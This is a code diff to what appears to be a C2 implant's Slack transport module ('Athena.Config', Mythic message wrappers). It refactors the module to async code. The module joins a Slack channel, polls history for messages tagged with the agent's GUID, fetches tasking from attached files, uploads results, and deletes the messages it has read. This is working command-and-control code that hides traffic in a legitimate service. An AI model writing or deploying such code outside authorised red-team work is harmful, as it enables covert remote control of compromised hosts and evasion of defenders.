@@ -108,15 +108,15 @@ namespace Athena.Config
             }
 
 
-            if (!JoinChannel())
+            if (!JoinChannel().Result)
             {
                 Environment.Exit(0);
             }
         }
-        private bool JoinChannel()
+        private async Task<bool> JoinChannel()
         {
             string data = "{\"channel\": \"" + this.channel + "\"}";
-            return SendPost("https://slack.com/api/conversations.join", data);
+            return await SendPost("https://slack.com/api/conversations.join", data);
         }
         public async Task<string> Send(object obj)
         {
@@ -151,48 +151,10 @@ namespace Athena.Config
                 i = 0;
 
                 //Give the server a second to respond.
-                Thread.Sleep(3000);
+                await Task.Delay(3000);
 
 
-                result = GetSlackMessages();
-                //Attempt this x times until we assume that the message callback failed and just return nothing.
-                while (result.Count < 1)
-                {
-                    if (!string.IsNullOrEmpty(current_message))
-                    {
-                        if (!GetReactions(current_message)) //File hasn't begun processing yet
-                        {
-                            if (i == this.messageChecks) //10 attempts should be plenty for a file to start processing after uploads
-                            {
-                                result = new Dictionary<string, MythicMessageWrapper>();
-                                break;
-                            }
-                        }
-                        else
-                        {
-                            if (i == (this.messageChecks * 2)) //Double the checks for a file that HAS had a response associated with it (Possibly remove this)
-                            {
-                                result = new Dictionary<string, MythicMessageWrapper>();
-                                break;
-                            }
-                        }
-                    }
-                    else //Not waiting on a file
-                    {
-                        if (i == this.messageChecks)
-                        {
-                            result = new Dictionary<string, MythicMessageWrapper>();
-                            break;
-                        }
-                    }
-
-                    //Take a break
-                    Thread.Sleep(this.timeBetweenChecks * 1000);
-
-                    //Increment our failure counter and try again
-                    i++;
-                    result = GetSlackMessages();
-                }
+                result = await GetSlackMessages();
 
                 //We should only be getting one message back so this is likely unneeded also
                 //But just in case I ever need it later, use LINQ to select unique messages from the result in the event we accidentally receive double messages.
@@ -217,7 +179,7 @@ namespace Athena.Config
                 }
 
                 //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
-                Task.Run(() => { DeleteMessages(result.Keys.ToList<string>()); });
+                DeleteMessages(result.Keys.ToList<string>());
 
                 //Indicate we're done with the current message
                 current_message = "";
@@ -261,7 +223,7 @@ namespace Athena.Config
                     final = true
                 };
                 Misc.WriteDebug("Uploading File.");
-                return UploadSlackFile(data, msg);
+                return await UploadSlackFile(data, msg);
             }
             else
             {
@@ -284,7 +246,7 @@ namespace Athena.Config
 
                 try
                 {
-                    return SendPost(url, JsonConvert.SerializeObject(sm));
+                    return await SendPost(url, JsonConvert.SerializeObject(sm));
                 }
                 catch (Exception e)
                 {
@@ -295,7 +257,7 @@ namespace Athena.Config
 
             }
         }
-        private bool UploadSlackFile(string data, MythicMessageWrapper mw)
+        private async Task<bool> UploadSlackFile(string data, MythicMessageWrapper mw)
         {
             string url = "https://slack.com/api/files.upload";
             //Wait for webclient to become available
@@ -339,62 +301,94 @@ namespace Athena.Config
                 {
                     try
                     {
-                        Thread.Sleep(int.Parse(webRes.Headers["Retry-After"]));
+                        await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                     }
                     catch (Exception ex)
                     {
                         Misc.WriteError($"[UploadSlackFile2] {ex.Message}");
                         Misc.WriteError(ex.StackTrace);
                         //Default wait 10s
-                        Thread.Sleep(10000);
+                        await Task.Delay(10000);
                     }
                     return false;
                 }
                 return false;
             }
         }
-        private bool DeleteMessages(List<string> messages)
+        private async Task<bool> DeleteMessages(List<string> messages)
         {
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
             string data = "{\"channel\":\"" + this.channel + "\",\"ts\":\"" + messages.FirstOrDefault() + "\"}";
-            return SendPost("https://slack.com/api/chat.delete", data);
+            return await SendPost("https://slack.com/api/chat.delete", data);
         }
-        private Dictionary<string, MythicMessageWrapper> GetSlackMessages()
+        private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
         {
             Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();
+            string res = "";
 
-            string res = SendGet($"https://slack.com/api/conversations.history?channel={this.channel}&limit=200");
-            ConversationHistoryResponse msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);
 
-            foreach (var message in msgResponse.messages)
+            for(int i = 0; i < this.messageChecks; i++) //Keep submitting web request until it works or we hit our max checks
             {
                 try
                 {
-                    if (message.text.Contains(this.agent_guid))
-                    {
-                        MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.text);
+                    res = await SendGet($"https://slack.com/api/conversations.history?channel={this.channel}&limit=200");
 
-                        if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
+                    ConversationHistoryResponse msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);
+
+                    if(msgResponse == null) //Try Again
+                    {
+                        await Task.Delay(this.timeBetweenChecks * 1000);
+                        continue;
+                    }
+
+                    foreach (var message in msgResponse.messages)
+                    {
+                        try
                         {
-                            if (String.IsNullOrEmpty(mythicMessage.message))
+                            if (message.text.Contains(this.agent_guid))
                             {
-                                mythicMessage.message = SendGet(message.files.FirstOrDefault().url_private);
+                                MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.text);
+
+                                if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
+                                {
+                                    if (String.IsNullOrEmpty(mythicMessage.message))
+                                    {
+                                        mythicMessage.message = await SendGet(message.files.FirstOrDefault().url_private);
+                                    }
+                                    messages.Add(message.ts, mythicMessage);
+                                }
                             }
-                            messages.Add(message.ts, mythicMessage);
+                        }
+                        catch (Exception e)
+                        {
+
+                            Misc.WriteError($"[GetSlackMessages] {e.Message}");
+                            Misc.WriteError(e.StackTrace);
                         }
                     }
+
+                    if(messages.Count < 1) //Try Again
+                    {
+                        await Task.Delay(this.timeBetweenChecks * 1000);
+                        continue;
+                    }
+                    else //Got some messages for us!
+                    {
+                        break;
+                    }
+                }
+                catch (WebException we)
+                {
+                    continue;
                 }
                 catch (Exception e)
                 {
-
-                    Misc.WriteError($"[GetSlackMessages] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
+                    continue;
                 }
             }
-
             return messages;
         }
-        private bool SendPost(string url, string data)
+        private async Task<bool> SendPost(string url, string data)
         {
             this.webClient.Headers[HttpRequestHeader.ContentType] = "application/json; charset=utf-8";
             while (this.webClient.IsBusy) ; ;
@@ -416,21 +410,25 @@ namespace Athena.Config
                     {
                         try
                         {
-                            Thread.Sleep(int.Parse(webRes.Headers["Retry-After"]));
+                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                         }
                         catch (Exception ex)
                         {
                             Misc.WriteError($"[SendPost] {ex.Message}");
                             Misc.WriteError(ex.StackTrace);
                             //Default wait 10s
-                            Thread.Sleep(10000);
+                            await Task.Delay(10000);
                         }
                     }
                 }
                 return false;
             }
+            catch (Exception ex)
+            {
+                return false;
+            }
         }
-        private string SendGet(string url)
+        private async Task<string> SendGet(string url)
         {
             if (String.IsNullOrEmpty(this.webClient.Headers["Authorization"]))
             {
@@ -439,7 +437,7 @@ namespace Athena.Config
 
             try
             {
-                return this.webClient.DownloadString(url);
+                return this.webClient.DownloadString(url) ?? "";
             }
             catch (WebException e)
             {
@@ -450,25 +448,31 @@ namespace Athena.Config
                     {
                         try
                         {
-                            Thread.Sleep(int.Parse(webRes.Headers["Retry-After"]));
+                            await Task.Delay(int.Parse(webRes.Headers["Retry-After"]));
                         }
                         catch (Exception ex)
                         {
                             Misc.WriteError($"[SendPost] {ex.Message}");
                             Misc.WriteError(ex.StackTrace);
                             //Default wait 10s
-                            Thread.Sleep(10000);
+                            await Task.Delay(10000);
                         }
                         return "";
                     }
                 }
                 return "";
             }
+            catch(Exception ex)
+            {
+                return "";
+            }
 
         }
-        private bool GetReactions(string timestamp)
+        private async Task<bool> GetReactions(string timestamp)
         {
-            ReactionResponseMessage rr = JsonConvert.DeserializeObject<ReactionResponseMessage>(this.SendGet($"https://slack.com/api/reactions.get?timestamp={timestamp}&channel={this.channel}"));
+            string res = await this.SendGet($"https://slack.com/api/reactions.get?timestamp={timestamp}&channel={this.channel}");
+
+            ReactionResponseMessage rr = JsonConvert.DeserializeObject<ReactionResponseMessage>(res);
 
             if (rr.ok)
             {
